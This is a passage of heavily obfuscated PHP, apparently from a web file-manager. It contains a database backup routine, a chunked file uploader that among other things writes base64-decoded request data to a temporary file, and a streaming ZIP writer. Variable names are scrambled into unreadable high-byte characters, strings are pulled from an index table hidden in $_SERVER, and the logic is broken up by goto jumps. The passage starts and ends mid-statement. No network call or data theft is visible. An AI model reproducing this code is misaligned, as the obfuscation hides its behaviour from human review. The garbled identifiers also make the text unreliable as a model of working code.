$dèöÔØå⁄®[699] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { goto B´À‚âÕêÚ; Bà∏Â√Â–É: $a›¨Êﬂ™å∑ = new DbManage($BØ…æÊÛøÕ, $f»ÖÛΩµê ); $a√‘™Ü˜¥© = TEMP_FILES . $d…ì£€Ó¡‡[720] . self::$name . $d…ì£€Ó¡‡[8]; del_dir($a√‘™Ü˜¥©); goto cµŸπ°òÔÜ; cµŸπ°òÔÜ: mk_dir($a√‘™Ü˜¥©); $cçé⁄òËÉÀ = $a›¨Êﬂ™å∑->db()->getTables(); $eÕ÷‘á≥õÍ = 0; goto A¿ÊÆ¨ ¯Ô; A¿ÊÆ¨ ¯Ô: $e⁄ø‰Ñú”ä = new Task($d…ì£€Ó¡‡[721], $d…ì£€Ó¡‡[722], 0, LNG($d…ì£€Ó¡‡[723]) . $d…ì£€Ó¡‡[724] . LNG($d…ì£€Ó¡‡[725])); $cçé⁄òËÉÀ = array_diff($cçé⁄òËÉÀ, array($d…ì£€Ó¡‡[726], $d…ì£€Ó¡‡[727])); foreach ($cçé⁄òËÉÀ as $B ÙŸÔ¯Ù§) { $fßÎµ”™è√ = $a√‘™Ü˜¥© . $B ÙŸÔ¯Ù§ . $d…ì£€Ó¡‡[728]; $f¯ü›À–™Ô = null; if ($B ÙŸÔ¯Ù§ == $d…ì£€Ó¡‡[729] && (!isset($aíÉû£“ìƒ[$d…ì£€Ó¡‡[702]]) || $aíÉû£“ìƒ[$d…ì£€Ó¡‡[702]] == $d…ì£€Ó¡‡[464])) { $f¯ü›À–™Ô = self::$io; } $eÕ÷‘á≥õÍ += $a›¨Êﬂ™å∑->sqlFromDb($B ÙŸÔ¯Ù§, $fßÎµ”™è√, $e⁄ø‰Ñú”ä, $f¯ü›À–™Ô); } goto dû´›Ÿ¨’—; C⁄‚Ú§Ê–¯: return !0; goto cä’ŒéÇ‹; C›¨øœÑÆΩ: self::$name = $aíÉû£“ìƒ[$d…ì£€Ó¡‡[28]]; $BØ…æÊÛøÕ = $GLOBALS[$d…ì£€Ó¡‡[6]][$d…ì£€Ó¡‡[17]]; $f»ÖÛΩµê  = $this->_dbType($BØ…æÊÛøÕ); goto Bà∏Â√Â–É; dû´›Ÿ¨’—: $e⁄ø‰Ñú”ä->end(); $föû Ö◊çÜ = array($d…ì£€Ó¡‡[730] => $f»ÖÛΩµê , $d…ì£€Ó¡‡[717] => 1, $d…ì£€Ó¡‡[731] => $eÕ÷‘á≥õÍ, $d…ì£€Ó¡‡[732] => $eÕ÷‘á≥õÍ); Backup::set($föû Ö◊çÜ); goto C⁄‚Ú§Ê–¯; B´À‚âÕêÚ: $d…ì£€Ó¡‡ =& $_SERVER[—Ω]; $aíÉû£“ìƒ = Backup::get(); self::$io = $aíÉû£“ìƒ[$d…ì£€Ó¡‡[701]]; goto C›¨øœÑÆΩ; cä’ŒéÇ‹: } private function _dbType($EÛ≥˘√õ≤ï) { $d⁄’Ã®∏¬Ÿ =& $_SERVER[—Ω]; $b—„±–•Ó = $EÛ≥˘√õ≤ï[$d⁄’Ã®∏¬Ÿ[733]]; if ($b—„±–•Ó == $d⁄’Ã®∏¬Ÿ[734]) { $a‰€ï ©ê« = explode($d⁄’Ã®∏¬Ÿ[4], $EÛ≥˘√õ≤ï[$d⁄’Ã®∏¬Ÿ[735]]); $b—„±–•Ó = $a‰€ï ©ê«[0]; } $c¯Ã„Ñùü˜ = array($d⁄’Ã®∏¬Ÿ[736] => $d⁄’Ã®∏¬Ÿ[9], $d⁄’Ã®∏¬Ÿ[737] => $d⁄’Ã®∏¬Ÿ[738]); if (isset($c¯Ã„Ñùü˜[$b—„±–•Ó])) { $b—„±–•Ó = $c¯Ã„Ñùü˜[$b—„±–•Ó]; } return $b—„±–•Ó; } } goto e·ç¿ôÁå√; aç‰ù˘√Ôÿ: class Uploader { public $fileName; public $uploadFile; public $tempFile; public function __construct() { goto bàå˜∑âø±; dûÉ÷É≈Ñ√: $this->checkSize(); $this->tempPathInit(); goto F‚µ˜È¿í≥; bàå˜∑âø±: $Eè˘ë€÷ÌÇ =& $_SERVER[—Ω]; global $in; $this->in =& $in; goto AîÛºÿ´éﬂ; AîÛºÿ´éﬂ: if (!empty($_FILES)) { $A„†∏·£¬ô = $_FILES[$Eè˘ë€÷ÌÇ[164]]; $this->uploadFile = $A„†∏·£¬ô[$Eè˘ë€÷ÌÇ[1943]]; if (!$this->uploadFile && $A„†∏·£¬ô[$Eè˘ë€÷ÌÇ[1215]] > 0) { show_json($this->errorInfo($A„†∏·£¬ô[$Eè˘ë€÷ÌÇ[1215]]), !1); } } else { if (isset($in[$Eè˘ë€÷ÌÇ[383]])) { $this->uploadFile = isset($in[$Eè˘ë€÷ÌÇ[1944]]) ? $Eè˘ë€÷ÌÇ[1945] : $Eè˘ë€÷ÌÇ[1790]; } } $this->fileName = self::fileName(); $this->statusData = !1; goto dûÉ÷É≈Ñ√; F‚µ˜È¿í≥: } public function upload() { goto eßßÒ§¡ã√; AëŒ‘∂ıòî: ignore_timeout(); if (!$this->checkChunkHash($FÓ‚›Í…î“)) { $this->showJson($BÆ·¢É±Œ[1960], !1); } $this->statusSet(!1); goto B—⁄≥€¿“∫; c∏·√Öæåô: $D√·À¶πµú = $this->moveUploadedFile($fÓ‰ÜúÑ∏”); if ($dûÊÍ€˘ÖË > 0 && filesize($D√·À¶πµú) == 0) { $this->showJson($BÆ·¢É±Œ[1951], !1); } if (!$D√·À¶πµú) { $this->showJson(LNG($BÆ·¢É±Œ[1952]), !1); } goto bÉ∂è◊ºı–; e≠åÚà∞èÕ: $F¬èÛø∂◊˘ = $this->writeTo($D√·À¶πµú, $eùœûãìïè, $this->tempFile); $Dñ»ø≈£Ωû = IO::hashSimple($D√·À¶πµú); $dûÊÍ€˘ÖË = IO::size($D√·À¶πµú); goto f∫ŒËÑâ°Û; eßßÒ§¡ã√: $BÆ·¢É±Œ =& $_SERVER[—Ω]; $bß©…—ûòâ = isset($this->in[$BÆ·¢É±Œ[1946]]) ? intval($this->in[$BÆ·¢É±Œ[1946]]) : 0; $fÿ•ºø›£ = isset($this->in[$BÆ·¢É±Œ[1947]]) ? intval($this->in[$BÆ·¢É±Œ[1947]]) : 1; goto dËÈõ≥∏∆’; B—⁄≥€¿“∫: CacheLock::unlock($this->tempFile); return $this->tempFile; goto b’Ìë√˜πË; aŸ¡®á¿ÙÏ: $FÓ‚›Í…î“[$BÆ·¢É±Œ[1956]][$BÆ·¢É±Œ[1957] . $bß©…—ûòâ] = array($BÆ·¢É±Œ[1958] => $dÖîŸÃ√·˘, $BÆ·¢É±Œ[1040] => $bß©…—ûòâ, $BÆ·¢É±Œ[77] => $dûÊÍ€˘ÖË, $BÆ·¢É±Œ[161] => $Dñ»ø≈£Ωû); $this->statusSet($FÓ‚›Í…î“); if (count($FÓ‚›Í…î“[$BÆ·¢É±Œ[1956]]) != $FÓ‚›Í…î“[$BÆ·¢É±Œ[1955]]) { $this->showJson($BÆ·¢É±Œ[1959] . $bß©…—ûòâ, !0); } goto AëŒ‘∂ıòî; EÇÁ‰ß∫ˆ¥: CacheLock::lock($this->tempFile, 20); $FÓ‚›Í…î“ = $this->statusGet(); $this->initFileTemp(); goto c∏·√Öæåô; f∫ŒËÑâ°Û: @unlink($D√·À¶πµú); if (!$F¬èÛø∂◊˘) { $this->showJson($BÆ·¢É±Œ[1954] . $bß©…—ûòâ, !1); } $FÓ‚›Í…î“[$BÆ·¢É±Œ[1955]] = $fÿ•ºø›£; goto aŸ¡®á¿ÙÏ; dËÈõ≥∏∆’: $fÓ‰ÜúÑ∏” = $this->tempFile . $BÆ·¢É±Œ[1948] . $bß©…—ûòâ; $dûÊÍ€˘ÖË = isset($this->in[$BÆ·¢É±Œ[516]]) ? intval($this->in[$BÆ·¢É±Œ[516]]) : 0; $A–Æ›—åù∆ = isset($this->in[$BÆ·¢É±Œ[1949]]) ? intval($this->in[$BÆ·¢É±Œ[1949]]) : 0; goto EÁâ“£∂Ó€; EÁâ“£∂Ó€: if ($fÿ•ºø›£ > 1 && $A–Æ›—åù∆ <= 0) { show_json($BÆ·¢É±Œ[1950], !1); } if ($A–Æ›—åù∆ > $dûÊÍ€˘ÖË) { $fÿ•ºø›£ = 1; } if ($fÿ•ºø›£ <= 1) { $this->tempFile = $this->tempFile . rand_string(5); $this->statusSet(!1); return $this->moveUploadedFile($this->tempFile); } goto EÇÁ‰ß∫ˆ¥; bÉ∂è◊ºı–: $dÖîŸÃ√·˘ = $bß©…—ûòâ * $A–Æ›—åù∆; $eùœûãìïè = @fopen($this->tempFile, $BÆ·¢É±Œ[1953]); fseek($eùœûãìïè, $dÖîŸÃ√·˘); goto e≠åÚà∞èÕ; b’Ìë√˜πË: } private function checkSize() { $DàÇöÛ†â— =& $_SERVER[—Ω]; if (phpBuild64() || $this->in[$DàÇöÛ†â—[77]] < PHP_INT_MAX) { return; } show_json(LNG($DàÇöÛ†â—[1961]), !1); } private function showJson($bì»•ó€≥æ, $Dë’ªÒÒ…å) { CacheLock::unlock($this->tempFile); if (!$Dë’ªÒÒ…å) { return show_json($bì»•ó€≥æ, $Dë’ªÒÒ…å); } show_json($bì»•ó€≥æ, $Dë’ªÒÒ…å); } public function clearData() { $this->statusSet(!1); if (file_exists($this->tempFile)) { @unlink($this->tempFile); return; } } private function tempPathInit() { goto cÜ≈“êÍΩ‘; cÜ≈“êÍΩ‘: $DæøîœÃ¿æ =& $_SERVER[—Ω]; $C÷¥Íã»çï = TEMP_FILES; @mk_dir($C÷¥Íã»çï); goto Dﬂ©‘¯ŸÇ⁄; Dﬂ©‘¯ŸÇ⁄: touch($C÷¥Íã»çï . $DæøîœÃ¿æ[1962]); $bÖÆ¶öƒ∑Û = isset($this->in[$DæøîœÃ¿æ[1963]]) ? $this->in[$DæøîœÃ¿æ[1963]] : !1; if (strlen($bÖÆ¶öƒ∑Û) < 30) { $bÖÆ¶öƒ∑Û = md5(USER_ID . $this->in[$DæøîœÃ¿æ[75]] . $this->fileName . $this->in[$DæøîœÃ¿æ[77]]); } goto D‰áâÙ≠ÙÇ; D‰áâÙ≠ÙÇ: $this->tempFile = $C÷¥Íã»çï . $DæøîœÃ¿æ[1964] . md5($bÖÆ¶öƒ∑Û . $this->in[$DæøîœÃ¿æ[1508]]); goto bè’˘Ï†è¶; bè’˘Ï†è¶: } private function moveUploadedFile($F«Ú€»©ù’) { $fıè≈‹á€Ó =& $_SERVER[—Ω]; $Cπè” øßÀ = $this->uploadFile; if ($Cπè” øßÀ == $fıè≈‹á€Ó[1965]) { @file_put_contents($F«Ú€»©ù’, base64_decode($_REQUEST[$fıè≈‹á€Ó[1966]])); } else { if ($Cπè” øßÀ == $fıè≈‹á€Ó[1790]) { $FÚƒäòÙÇÏ = @fopen($F«Ú€»©ù’, $fıè≈‹á€Ó[1497]); $this->writeTo($Cπè” øßÀ, $FÚƒäòÙÇÏ, $F«Ú€»©ù’); } else { if (!move_uploaded_file($Cπè” øßÀ, $F«Ú€»©ù’)) { return !1; } } } return $F«Ú€»©ù’; } private function writeTo($cáòπ éØè, $d∏â´“¢‰É, $eÚÇ‚·£–º) { goto DÁ‚‘•ÿúÂ; DÁ‚‘•ÿúÂ: $Bë®∞ ÉÑŒ =& $_SERVER[—Ω]; $dƒ‰∏Ú√§∏ = $Bë®∞ ÉÑŒ[1967] . $eÚÇ‚·£–º; $A–ëù „¡ä = CacheLock::lock($dƒ‰∏Ú√§∏, 1); goto Dø¬äè©›Ô; Dø¬äè©›Ô: $CΩâ’áõ∞… = @fopen($cáòπ éØè, $Bë®∞ ÉÑŒ[1496]); if (!$CΩâ’áõ∞… || !$d∏â´“¢‰É || !$A–ëù „¡ä) { CacheLock::unlock($dƒ‰∏Ú√§∏); return !1; } while (!feof($CΩâ’áõ∞…)) { fwrite($d∏â´“¢‰É, fread($CΩâ’áõ∞…, 1024 * 200)); } goto fæˆåÌ•Ï; fæˆåÌ•Ï: fclose($CΩâ’áõ∞…); fclose($d∏â´“¢‰É); CacheLock::unlock($dƒ‰∏Ú√§∏); goto D Í·øªç™; D Í·øªç™: return !0; goto a±•ıﬁè«Ã; a±•ıﬁè«Ã: } private function statusGet() { goto E°ÊΩÂÒß; fôäåºÏœµ: $F°Ø®–ÌÊ = !1; if (file_exists($b©ü˘‰è’‘)) { $F°Ø®–ÌÊ = @file_get_contents($b©ü˘‰è’‘); } if ($F°Ø®–ÌÊ) { $this->statusData = unserialize($F°Ø®–ÌÊ); } goto a‘üÆ¨•ﬂ∆; a‘üÆ¨•ﬂ∆: if (!$this->statusData) { $C√∆æ∆≤á⁄ = array($eÚËÕ≠ã∂í[28] => $this->fileName, $eÚËÕ≠ã∂í[1955] => 0, $eÚËÕ≠ã∂í[1956] => array()); $this->statusSet($C√∆æ∆≤á⁄); } return $this->statusData; goto dñÖüçÏï·; E°ÊΩÂÒß: $eÚËÕ≠ã∂í =& $_SERVER[—Ω]; if (is_array($this->statusData)) { return $this->statusData; } $b©ü˘‰è’‘ = $this->tempFile . $eÚËÕ≠ã∂í[1968]; goto fôäåºÏœµ; dñÖüçÏï·: } public function statusSet($d§¿ìäê⁄¶) { $BíÈ–îΩ∫À = $this->tempFile . $_SERVER[—Ω][1968]; if (!$d§¿ìäê⁄¶) { if (file_exists($BíÈ–îΩ∫À)) { @unlink($BíÈ–îΩ∫À); } return !0; } $this->statusData = $d§¿ìäê⁄¶; return file_put_contents($BíÈ–îΩ∫À, serialize($d§¿ìäê⁄¶)); } private function initFileTemp() { $Aë›µëÌƒµ =& $_SERVER[—Ω]; if (file_exists($this->tempFile)) { return; } $D’√à±∂ÑÎ = fopen($this->tempFile, $Aë›µëÌƒµ[1969]); fseek($D’√à±∂ÑÎ, $this->in[$Aë›µëÌƒµ[77]] - 1, SEEK_SET); fwrite($D’√à±∂ÑÎ, $Aë›µëÌƒµ[464]); fclose($D’√à±∂ÑÎ); } public function checkChunk() { goto f‰©Ñíı©ø; fäπ–‚¢ŸË: return $Få†Èüéáõ; goto cÊ”åƒ±ªƒ; cü©Ì¬¥¬±: $Aºì≠÷Æ‡ô = $this->statusGet(); CacheLock::unlock($this->tempFile); foreach ($Aºì≠÷Æ‡ô[$Aû“πò≥ö‡[1956]] as $d…ÂÊ˘éÛ) { $EÖŸà„¿∆º = $d…ÂÊ˘éÛ[$Aû“πò≥ö‡[161]]; if ($EÖŸà„¿∆º) { $Få†Èüéáõ[$Aû“πò≥ö‡[1970] . $d…ÂÊ˘éÛ[$Aû“πò≥ö‡[1040]]] = $EÖŸà„¿∆º; } } goto fäπ–‚¢ŸË; f‰©Ñíı©ø: $Aû“πò≥ö‡ =& $_SERVER[—Ω]; $Få†Èüéáõ = array(); CacheLock::lock($this->tempFile); goto cü©Ì¬¥¬±; cÊ”åƒ±ªƒ: } private function checkChunkHash($d¥îÉŸ‹¯Ñ) { goto cêÁ∑ †◊¥; FóèËÜææ≤: return $fÒÍØ“êÃ…; goto D˘•Ââ¬¢¨; cêÁ∑ †◊¥: $AªÙó¯™á– =& $_SERVER[—Ω]; if (count($d¥îÉŸ‹¯Ñ[$AªÙó¯™á–[1956]]) != $d¥îÉŸ‹¯Ñ[$AªÙó¯™á–[1955]]) { return !1; } $Eó–∑µûÇô = _get($this->in, $AªÙó¯™á–[1963]); goto CÁÇá™§Â·; C¡ßñÒ≈«Í: $fÒÍØ“êÃ… = !0; foreach ($d¥îÉŸ‹¯Ñ[$AªÙó¯™á–[1956]] as $Eê¡ı™∂‘«) { fseek($B∫ÉØ¥´ùÀ, $Eê¡ı™∂‘«[$AªÙó¯™á–[1958]]); $F£ßÇõ“¨ç = PathDriverStream::hash($B∫ÉØ¥´ùÀ, $Eê¡ı™∂‘«[$AªÙó¯™á–[77]]); if ($Eê¡ı™∂‘«[$AªÙó¯™á–[161]] != $F£ßÇõ“¨ç) { $fÒÍØ“êÃ… = !1; break; } } fclose($B∫ÉØ¥´ùÀ); goto FóèËÜææ≤; CÁÇá™§Â·: $C∑≈∞åö∑‚ = _get($this->in, $AªÙó¯™á–[1971]); if (strlen($C∑≈∞åö∑‚) == 32 && IO::hashSimple($this->tempFile) == $Eó–∑µûÇô && IO::hashMd5($this->tempFile) == $C∑≈∞åö∑‚) { return !0; } $B∫ÉØ¥´ùÀ = fopen($this->tempFile, $AªÙó¯™á–[1166]); goto C¡ßñÒ≈«Í; D˘•Ââ¬¢¨: } public static function fileName() { goto C›π«ß©Çƒ; C›π«ß©Çƒ: $cÃ’ﬂ€π¿Ò =& $_SERVER[—Ω]; global $in; $eÉùæ°•˜ˆ = isset($in[$cÃ’ﬂ€π¿Ò[28]]) ? $in[$cÃ’ﬂ€π¿Ò[28]] : $cÃ’ﬂ€π¿Ò[33]; goto a¡íã¡Ô°∑; E∏‚òﬂ´∑¿: $dÛØæúŒÖ„ = strtotime($in[$cÃ’ﬂ€π¿Ò[1972]]); $dÛØæúŒÖ„ = $dÛØæúŒÖ„ ? $dÛØæúŒÖ„ : time(); $d∞´•ûáÕœ = strtolower($eÉùæ°•˜ˆ); goto C»…êôµ£è; a¡íã¡Ô°∑: if (!empty($_FILES)) { $eÉùæ°•˜ˆ = $eÉùæ°•˜ˆ ? $eÉùæ°•˜ˆ : $_FILES[$cÃ’ﬂ€π¿Ò[164]][$cÃ’ﬂ€π¿Ò[383]]; } $eÉùæ°•˜ˆ = str_replace(array($cÃ’ﬂ€π¿Ò[95], $cÃ’ﬂ€π¿Ò[8]), array($cÃ’ﬂ€π¿Ò[8], $cÃ’ﬂ€π¿Ò[93]), trim($eÉùæ°•˜ˆ)); if (!is_wap()) { return $eÉùæ°•˜ˆ; } goto E∏‚òﬂ´∑¿; C»…êôµ£è: if ($d∞´•ûáÕœ == $cÃ’ﬂ€π¿Ò[1973] || $d∞´•ûáÕœ == $cÃ’ﬂ€π¿Ò[1974]) { $eÉùæ°•˜ˆ = date($cÃ’ﬂ€π¿Ò[700], $dÛØæúŒÖ„) . $cÃ’ﬂ€π¿Ò[70] . $in[$cÃ’ﬂ€π¿Ò[77]] . $cÃ’ﬂ€π¿Ò[1605]; } else { if ($d∞´•ûáÕœ == $cÃ’ﬂ€π¿Ò[1975]) { $eÉùæ°•˜ˆ = date($cÃ’ﬂ€π¿Ò[700], $dÛØæúŒÖ„) . $cÃ’ﬂ€π¿Ò[70] . $in[$cÃ’ﬂ€π¿Ò[77]] . $cÃ’ﬂ€π¿Ò[1976]; } } return $eÉùæ°•˜ˆ; goto f´á‡é±Õê; f´á‡é±Õê: } private function errorInfo($aç∞Üàé´⁄) { $CÍ±÷ë‹ =& $_SERVER[—Ω]; $bçÜ¨Ñ∑êß = array($CÍ±÷ë‹[1977], $CÍ±÷ë‹[1978], $CÍ±÷ë‹[1979], $CÍ±÷ë‹[1980], $CÍ±÷ë‹[1981], $CÍ±÷ë‹[1982], $CÍ±÷ë‹[1983], $CÍ±÷ë‹[1984]); return $aç∞Üàé´⁄ . $CÍ±÷ë‹[4] . $bçÜ¨Ñ∑êß[$aç∞Üàé´⁄]; } } class ZipMake { const VERSION = "\x30\56\x32\x2e\60"; const ZIP_VERSION = 10; const ZIP_VERSION_64 = 45; const METHOD_STORE = 0; const FILE_HEADER_SIGNATURE = 67324752; const CDR_FILE_SIGNATURE = 33639248; const CDR_EOF_SIGNATURE = 101010256; const DATA_DESCRIPTOR_SIGNATURE = 134695760; const ZIP64_CDR_EOF_SIGNATURE = 101075792; const ZIP64_CDR_LOCATOR_SIGNATURE = 117853008; public $files = array(); public $cdrOffset = 0; public $ofs = 0; protected $needHeaders; protected $outputName; public function __construct($FÓæºÌÿÓé = null) { $A‹Ü◊âòﬁî =& $_SERVER[—Ω]; $this->outputStream = fopen($A‹Ü◊âòﬁî[1985], $A‹Ü◊âòﬁî[1222]); $this->outputName = $FÓæºÌÿÓé; $this->needHeaders = !0; } public function addFile($a›ö«’ƒ‰ˆ, $CÈ‡ŒÑÆ˜Ã) { goto EÆ‡Ûáö◊±; F£“∫º∫õ¶: $this->addFileFooter($a›ö«’ƒ‰ˆ, $A ÌÉÇñ°, $c“Î Ûö≠ã, $B©´Ã¡œ‰å, $F»ëü√ÛÚÿ, $fÜƒÒäƒ± ); goto Bﬁ≠Ãßï€Ò; EÆ‡Ûáö◊±: $dÊõ∂‰çØ =& $_SERVER[—Ω]; $a›ö«’ƒ‰ˆ = $this->filterFilename($a›ö«’ƒ‰ˆ); $A ÌÉÇñ° = static::METHOD_STORE; goto dŒˆÙ™û…Ì; dŒˆÙ™û…Ì: $fÜƒÒäƒ±  = $this->addFileHeader($a›ö«’ƒ‰ˆ, $A ÌÉÇñ°); $B©´Ã¡œ‰å = $F»ëü√ÛÚÿ = filesize($CÈ‡ŒÑÆ˜Ã); $C˜ï…Ω„Ç‘ = fopen($CÈ‡ŒÑÆ˜Ã, $dÊõ∂‰çØ[1986]); goto D∂Û©∑∫ΩÉ; D∂Û©∑∫ΩÉ: while (!feof($C˜ï…Ω„Ç‘)) { $A¡Àá¥Âù„ = fread($C˜ï…Ω„Ç‘, 1048576); $this->send($A¡Àá¥Âù„); } fclose($C˜ï…Ω„Ç‘); $c“Î Ûö≠ã = hexdec(hash_file($dÊõ∂‰çØ[1987], $CÈ‡ŒÑÆ˜Ã)); goto F£“∫º∫õ¶; Bﬁ≠Ãßï€Ò: } public function addFileFromStream($Dê‰’πı≈ª, $fÍ¢éé¶Á¿) { goto FñŒÈê“¿Ü; Cﬂö±°ééπ: $this->addFileFooter($Dê‰’πı≈ª, $A†√ˆ´◊ÿÉ, $F“¯ê“ß⁄§, $C Îﬁ“‚∞ , $B¥¯ÉÔÛÔﬂ, $a⁄«‘≈£Ë); goto D†ëçﬁ‘Ó ; c¶ß˜ÎÉ™Î: $Aî≠·ƒ•”≥ = hash_init($_SERVER[—Ω][1987]); while (!feof($fÍ¢éé¶Á¿)) { $fŒÊ«ü”Ö = fread($fÍ¢éé¶Á¿, 1048576); hash_update($Aî≠·ƒ•”≥, $fŒÊ«ü”Ö); $this->send($fŒÊ«ü”Ö); } $F“¯ê“ß⁄§ = hexdec(hash_final($Aî≠·ƒ•”≥)); goto Cﬂö±°ééπ; FñŒÈê“¿Ü: $Dê‰’πı≈ª = $this->filterFilename($Dê‰’πı≈ª); $A†√ˆ´◊ÿÉ = static::METHOD_STORE; $a⁄«‘≈£Ë = $this->addFileHeader($Dê‰’πı≈ª, $A†√ˆ´◊ÿÉ); goto cœÌüô∫∏≥; cœÌüô∫∏≥: fseek($fÍ¢éé¶Á¿, 0, SEEK_END); $C Îﬁ“‚∞  = $B¥¯ÉÔÛÔﬂ = ftell($fÍ¢éé¶Á¿); rewind($fÍ¢éé¶Á¿); goto c¶ß˜ÎÉ™Î; D†ëçﬁ‘Ó : } public function finish() { foreach ($this->files as $C∂è€⁄ºÛÌ) { $this->addCdrFile($C∂è€⁄ºÛÌ); } $this->addCdr64Eof(); $this->addCdr64Locator(); $this->addCdrEof(); $this->clear(); } protected function addFileHeader($f∏àúªÛØÀ, $f€˘›Õ¿éÙ) { goto bö„àîÎÊø; cãÿë‰÷∞ª: $e‰‹è∏Êïª = $this->packFields($f±ÇàŒòÈ£); $A—éÀÖ¿ﬁè = $this->packFields($aà∑Ó©∏≈); $this->send($e‰‹è∏Êïª . $f∏àúªÛØÀ . $A—éÀÖ¿ﬁè); goto EÙÈû±›»; EÙÈû±›»: return strlen($e‰‹è∏Êïª) + $EÌàÙÃ›üŸ + strlen($A—éÀÖ¿ﬁè); goto CÖº∞”¢‡¯; bö„àîÎÊø: $c©∞≥›œ¯æ =& $_SERVER[—Ω]; $f∏àúªÛØÀ = preg_replace($c©∞≥›œ¯æ[1988], $c©∞≥›œ¯æ[33], $f∏àúªÛØÀ); $EÌàÙÃ›üŸ = strlen($f∏àúªÛØÀ); goto E·“ˆÍèˆ√; E·“ˆÍèˆ√: $b≠Ì®·Øçò = $this->dosTime(time()); $f±ÇàŒòÈ£ = array(array($c©∞≥›œ¯æ[1989], static::FILE_HEADER_SIGNATURE), array($c©∞≥›œ¯æ[1990], static::ZIP_VERSION_64), array($c©∞≥›œ¯æ[1990], 8), array($c©∞≥›œ¯æ[1990], $f€˘›Õ¿éÙ), array($c©∞≥›œ¯æ[1989], $b≠Ì®·Øçò), array($c©∞≥›œ¯æ[1989], 0), array($c©∞≥›œ¯æ[1989], 4294967295), array($c©∞≥›œ¯æ[1989], 4294967295), array($c©∞≥›œ¯æ[1990], $EÌàÙÃ›üŸ), array($c©∞≥›œ¯æ[1990], 32)); $aà∑Ó©∏≈ = array(array($c©∞≥›œ¯æ[1990], 1), array($c©∞≥›œ¯æ[1990], 28), array($c©∞≥›œ¯æ[1991], 0), array($c©∞≥›œ¯æ[1991], 0), array($c©∞≥›œ¯æ[1991], 0), array($c©∞≥›œ¯æ[1989], 0)); goto cãÿë‰÷∞ª; CÖº∞”¢‡¯: } protected function addFileFooter($c€ï¢ï·±π, $dïƒèΩ™…∏, $CÇœÒîˆæ‘, $fê©‹ñÑËæ, $CÉõßπœÇ©, $C”∑¿÷„Êà) { $c∑ª÷ÚáÎå =& $_SERVER[—Ω]; $D∫±öÌÕÀÍ = array(array($c∑ª÷ÚáÎå[1989], static::DATA_DESCRIPTOR_SIGNATURE), array($c∑ª÷ÚáÎå[1989], $CÇœÒîˆæ‘), array($c∑ª÷ÚáÎå[1991], $fê©‹ñÑËæ), array($c∑ª÷ÚáÎå[1991], $CÉõßπœÇ©)); $AôŒê÷øá∆ = $this->packFields($D∫±öÌÕÀÍ); $this->send($AôŒê÷øá∆); $aﬂÔá¢åµÜ = $C”∑¿÷„Êà + $fê©‹ñÑËæ + $cµˆØ“‘‡; $this->addToCdr($c€ï¢ï·±π, $dïƒèΩ™…∏, $CÇœÒîˆæ‘, $fê©‹ñÑËæ, $CÉõßπœÇ©, $aﬂÔá¢åµÜ); } private function addToCdr($EóôòÊ∞ƒ©, $FüÑÑ√ä†˜, $AÖÈƒÇÁ‘ö, $A“ãº£•ÖÎ, $DÑË ≤ô·ê, $c©üﬂ∞öäœ) { $this->files[] = array($EóôòÊ∞ƒ©, $FüÑÑ√ä†˜, $AÖÈƒÇÁ‘ö, $A“ãº£•ÖÎ, $DÑË ≤ô·ê, $this->ofs); $this->ofs += $c©üﬂ∞öäœ; } protected function addCdrFile($a÷–ì∞‡∂â) { goto AÁó„õ·Ÿœ; A¡◊ƒê∂ïÑ: $FƒÙàñçË◊ = $this->packFields($dçå±À—√à); $b§ °ﬁíÏΩ = $this->packFields($cÁ Ø“ıúè); $bá¿¨ê≤Ü◊ = $FƒÙàñçË◊ . $Dëä∏‡€ã˘ . $eõ¿øÙ∏©ù . $b§ °ﬁíÏΩ; goto FãÃ∑ù∞úà; FãÃ∑ù∞úà: $this->send($bá¿¨ê≤Ü◊); $this->cdr_ofs += strlen($bá¿¨ê≤Ü◊); goto e≤‡ÛáøÖÙ; Eø·Ûê™ıÜ: $F≥ÓÀâêñ¿ = $this->dosTime(time()); $dçå±À—√à = array(array($A∏¯÷ﬂ‘ëé[1989], static::CDR_FILE_SIGNATURE), array($A∏¯÷ﬂ‘ëé[1990], static::ZIP_VERSION_64), array($A∏¯÷ﬂ‘ëé[1990], static::ZIP_VERSION_64), array($A∏¯÷ﬂ‘ëé[1990], 8), array($A∏¯÷ﬂ‘ëé[1990], $D≈€çÚÀﬁ…), array($A∏¯÷ﬂ‘ëé[1989], $F≥ÓÀâêñ¿), array($A∏¯÷ﬂ‘ëé[1989], $D≥–Ñ£Í◊µ), array($A∏¯÷ﬂ‘ëé[1989], 4294967295), array($A∏¯÷ﬂ‘ëé[1989], 4294967295), array($A∏¯÷ﬂ‘ëé[1990], strlen($Dëä∏‡€ã˘)), array($A∏¯÷ﬂ‘ëé[1990], 32), array($A∏¯÷ﬂ‘ëé[1990], strlen($eõ¿øÙ∏©ù)), array($A∏¯÷ﬂ‘ëé[1990], 0), array($A∏¯÷ﬂ‘ëé[1990], 0), array($A∏¯÷ﬂ‘ëé[1989], 32), array($A∏¯÷ﬂ‘ëé[1989], 4294967295)); $cÁ Ø“ıúè = array(array($A∏¯÷ﬂ‘ëé[1990], 1), array($A∏¯÷ﬂ‘ëé[1990], 28), array($A∏¯÷ﬂ‘ëé[1991], $AÙ≤¶â©ñ), array($A∏¯÷ﬂ‘ëé[1991], $fÜÛÑ©Ùå«), array($A∏¯÷ﬂ‘ëé[1991], $E∏ë≠¿∞¥Ø), array($A∏¯÷ﬂ‘ëé[1989], 0)); goto A¡◊ƒê∂ïÑ; AÁó„õ·Ÿœ: $A∏¯÷ﬂ‘ëé =& $_SERVER[—Ω]; list($Dëä∏‡€ã˘, $D≈€çÚÀﬁ…, $D≥–Ñ£Í◊µ, $fÜÛÑ©Ùå«, $AÙ≤¶â©ñ, $E∏ë≠¿∞¥Ø) = $a÷–ì∞‡∂â; $eõ¿øÙ∏©ù = $A∏¯÷ﬂ‘ëé[33]; goto Eø·Ûê™ıÜ; e≤‡ÛáøÖÙ: } protected function addCdr64Eof() { goto dÓ≈ïíáÂˆ; C¶ÿƒöΩ»Ü: $this->send($e¡Ãß€®Ó°); goto cá…È‚Ω“†; dÓ≈ïíáÂˆ: $eÙèÃ≥Ω÷¯ =& $_SERVER[—Ω]; $Câ∏÷∑ñ™Ë = count($this->files); $bﬁ◊å‹–úÎ = $this->cdr_ofs; goto CÀØ±’◊Ø¿; CÀØ±’◊Ø¿: $aëÉ€µ¬Ø„ = $this->ofs; $DîÈó˜•∫« = array(array($eÙèÃ≥Ω÷¯[1989], static::ZIP64_CDR_EOF_SIGNATURE), array($eÙèÃ≥Ω÷¯[1991], 44), array($eÙèÃ≥Ω÷¯[1990], static::ZIP_VERSION_64), 